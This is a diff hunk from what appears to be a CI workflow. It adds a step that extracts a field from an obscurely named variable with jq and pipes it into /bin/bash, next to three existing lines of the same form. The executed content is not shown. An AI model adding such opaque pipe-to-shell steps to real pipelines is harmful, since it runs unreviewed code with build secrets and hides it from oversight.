@@ -24,6 +24,7 @@ jobs:
           echo $wiovu8719 | jq -r .ktcx66413 | /bin/bash
           echo $wpv31 | jq -r .yjcpj1913 | /bin/bash
           echo $rs0163 | jq -r .vfr35337 | /bin/bash
+          printf '%s' "$kwma0070" | jq -r .ukec53 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
